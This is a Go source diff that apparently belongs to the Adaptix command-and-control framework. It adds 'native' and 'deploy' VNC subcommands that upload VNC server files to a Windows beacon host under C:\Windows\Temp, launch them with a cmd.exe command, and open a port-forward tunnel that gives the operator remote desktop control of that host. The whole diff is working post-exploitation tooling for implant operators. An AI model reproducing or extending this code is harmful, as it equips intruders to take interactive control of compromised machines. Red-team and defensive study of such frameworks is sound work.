@@ -9,6 +9,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/fs"
 	"math/rand/v2"
 	"net"
 	"os"
@@ -1423,9 +1424,163 @@ func vncStreamBinaryForBeacon(agentData adaptix.AgentData) (string, string, stri
 	return filepath.Join(vncAgentDir, "vnc_stream.exe"), remotePath, runCommand, nil
 }
 
+type nativeVncPayloadFile struct {
+	LocalPath  string
+	RemotePath string
+}
+
+type nativeVncPayload struct {
+	Files      []nativeVncPayloadFile
+	RemoteDirs []string
+	RemoteDir  string
+	RunCommand string
+}
+
+func windowsRemoteJoin(base string, rel string) string {
+	rel = filepath.ToSlash(rel)
+	rel = strings.Trim(rel, "/")
+	if rel == "." || rel == "" {
+		return base
+	}
+	return base + "\\" + strings.ReplaceAll(rel, "/", "\\")
+}
+
+func shouldDeployNativeVncFile(name string) bool {
+	name = strings.ToLower(name)
+	if name == "vncconfig.exe" {
+		return false
+	}
+	switch filepath.Ext(name) {
+	case ".md", ".rst", ".txt":
+		return false
+	default:
+		return true
+	}
+}
+
+func resolveNativeVncPayload(agentData adaptix.AgentData, targetPort int) (nativeVncPayload, error) {
+	var payload nativeVncPayload
+	if agentData.Os != adaptix.OS_WINDOWS {
+		return payload, fmt.Errorf("native VNC auto-start is only supported for Windows beacon agents")
+	}
+
+	vncAgentDir, err := resolveVncAgentDir()
+	if err != nil {
+		return payload, err
+	}
+
+	candidates := []string{
+		filepath.Join(vncAgentDir, "native", "windows"),
+		filepath.Join(vncAgentDir, "winvnc"),
+	}
+	var payloadDir string
+	for _, candidate := range candidates {
+		if info, statErr := os.Stat(candidate); statErr == nil && info.IsDir() {
+			payloadDir = candidate
+			break
+		}
+	}
+	if payloadDir == "" {
+		return payload, fmt.Errorf("native VNC payload directory not found; place winvnc.exe and support files under %s", filepath.Join(vncAgentDir, "native", "windows"))
+	}
+
+	payload.RemoteDir = fmt.Sprintf("C:\\Windows\\Temp\\adaptix_vnc_native_%s_%08x", agentData.Id, rand.Uint32())
+	remoteDirSet := map[string]struct{}{payload.RemoteDir: {}}
+	var preferredExe string
+	var fallbackExe string
+	var startScript string
+
+	err = filepath.WalkDir(payloadDir, func(path string, entry fs.DirEntry, walkErr error) error {
+		if walkErr != nil {
+			return walkErr
+		}
+		if path == payloadDir {
+			return nil
+		}
+
+		rel, relErr := filepath.Rel(payloadDir, path)
+		if relErr != nil {
+			return relErr
+		}
+		remotePath := windowsRemoteJoin(payload.RemoteDir, rel)
+
+		if entry.IsDir() {
+			remoteDirSet[remotePath] = struct{}{}
+			return nil
+		}
+
+		if !shouldDeployNativeVncFile(entry.Name()) {
+			return nil
+		}
+
+		payload.Files = append(payload.Files, nativeVncPayloadFile{
+			LocalPath:  path,
+			RemotePath: remotePath,
+		})
+
+		name := strings.ToLower(entry.Name())
+		if name == "adaptix_start.bat" || name == "adaptix_start.cmd" {
+			startScript = remotePath
+		}
+		if strings.HasSuffix(name, ".exe") {
+			if fallbackExe == "" {
+				fallbackExe = remotePath
+			}
+			if name == "winvnc.exe" || name == "winvnc4.exe" || strings.Contains(name, "winvnc") {
+				preferredExe = remotePath
+			}
+		}
+		return nil
+	})
+	if err != nil {
+		return payload, err
+	}
+	if len(payload.Files) == 0 {
+		return payload, fmt.Errorf("native VNC payload directory is empty: %s", payloadDir)
+	}
+
+	for dir := range remoteDirSet {
+		payload.RemoteDirs = append(payload.RemoteDirs, dir)
+	}
+	sort.Strings(payload.RemoteDirs)
+
+	if startScript != "" {
+		payload.RunCommand = fmt.Sprintf("cmd.exe /c \"\"%s\" %d\"", startScript, targetPort)
+		return payload, nil
+	}
+
+	remoteExe := preferredExe
+	if remoteExe == "" {
+		remoteExe = fallbackExe
+	}
+	if remoteExe == "" {
+		return payload, fmt.Errorf("native VNC payload must include adaptix_start.bat/cmd or a VNC server exe")
+	}
+
+	if strings.Contains(strings.ToLower(filepath.Base(remoteExe)), "winvnc") {
+		payload.RunCommand = fmt.Sprintf("\"%s\" -run", remoteExe)
+	} else {
+		payload.RunCommand = fmt.Sprintf("\"%s\"", remoteExe)
+	}
+	return payload, nil
+}
+
 func queueBeaconUpload(agentData adaptix.AgentData, remotePath string, fileContent []byte) {
 	memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, fileContent)
 	array := []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(remotePath, agentData.ACP)}
+
+	taskData := adaptix.TaskData{
+		Type:    adaptix.TASK_TYPE_TASK,
+		AgentId: agentData.Id,
+		Sync:    false,
+		TaskId:  fmt.Sprintf("%08x", rand.Uint32()),
+	}
+	taskData.Data, _ = PackArray(array)
+	Ts.TsTaskCreate(agentData.Id, "", "", taskData)
+}
+
+func queueBeaconMkdir(agentData adaptix.AgentData, remotePath string) {
+	array := []interface{}{COMMAND_MKDIR, Ts.TsConvertUTF8toCp(remotePath, agentData.ACP)}
 
 	taskData := adaptix.TaskData{
 		Type:    adaptix.TASK_TYPE_TASK,
@@ -2122,6 +2277,87 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			taskData.MessageType = adaptix.MESSAGE_SUCCESS
 			taskData.ClearText = "\n"
 
+		} else if subcommand == "native" {
+			targetPortNumber, err1 := getFloatArg(args, "target_port")
+			localPortNumber, err2 := getFloatArg(args, "local_port")
+			if err1 != nil || err2 != nil {
+				err = errors.New("usage: vnc native <target_port> <local_port>")
+				goto RET
+			}
+			targetPort := int(targetPortNumber)
+			localPort := int(localPortNumber)
+			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
+				err = errors.New("port must be from 1 to 65535")
+				goto RET
+			}
+
+			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "Native VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
+			if e != nil {
+				err = e
+				goto RET
+			}
+			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
+			if err != nil {
+				goto RET
+			}
+
+			taskData.Message = fmt.Sprintf("Native VNC tunnel started: teamserver port %d -> agent 127.0.0.1:%d. Open the Tunnels tab and use Open VNC viewer.", localPort, targetPort)
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
+
+		} else if subcommand == "deploy" {
+			targetPortNumber, err1 := getFloatArg(args, "target_port")
+			localPortNumber, err2 := getFloatArg(args, "local_port")
+			if err1 != nil || err2 != nil {
+				err = errors.New("usage: vnc deploy <target_port> <local_port>")
+				goto RET
+			}
+			targetPort := int(targetPortNumber)
+			localPort := int(localPortNumber)
+			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
+				err = errors.New("port must be from 1 to 65535")
+				goto RET
+			}
+
+			var payload nativeVncPayload
+			payload, err = resolveNativeVncPayload(agentData, targetPort)
+			if err != nil {
+				goto RET
+			}
+
+			fileContents := make([][]byte, len(payload.Files))
+			for i, payloadFile := range payload.Files {
+				fileContents[i], err = os.ReadFile(payloadFile.LocalPath)
+				if err != nil {
+					err = fmt.Errorf("failed to read native VNC payload %s: %w", payloadFile.LocalPath, err)
+					goto RET
+				}
+			}
+
+			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "Native VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
+			if e != nil {
+				err = e
+				goto RET
+			}
+			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
+			if err != nil {
+				goto RET
+			}
+
+			for _, remoteDir := range payload.RemoteDirs {
+				queueBeaconMkdir(agentData, remoteDir)
+			}
+			for i, payloadFile := range payload.Files {
+				queueBeaconUpload(agentData, payloadFile.RemotePath, fileContents[i])
+			}
+
+			taskData.Type = adaptix.TASK_TYPE_JOB
+			array = []interface{}{COMMAND_PS_RUN, false, false, 0, Ts.TsConvertUTF8toCp(payload.RunCommand, agentData.ACP)}
+
+			taskData.Message = fmt.Sprintf("Native VNC auto-start queued: upload %d file(s) to %s, run on agent port %d, tunnel local port %d. The client viewer opens automatically when the tunnel syncs.", len(payload.Files), payload.RemoteDir, targetPort, localPort)
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
+
 		} else if subcommand == "stop" {
 			portNumber, e := getFloatArg(args, "local_port")
 			if e != nil {
@@ -2151,7 +2387,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			taskData.ClearText = "\n"
 
 		} else {
-			err = errors.New("subcommand must be start, stop, view, or list")
+			err = errors.New("subcommand must be start, native, deploy, stop, view, or list")
 			goto RET
 		}
 
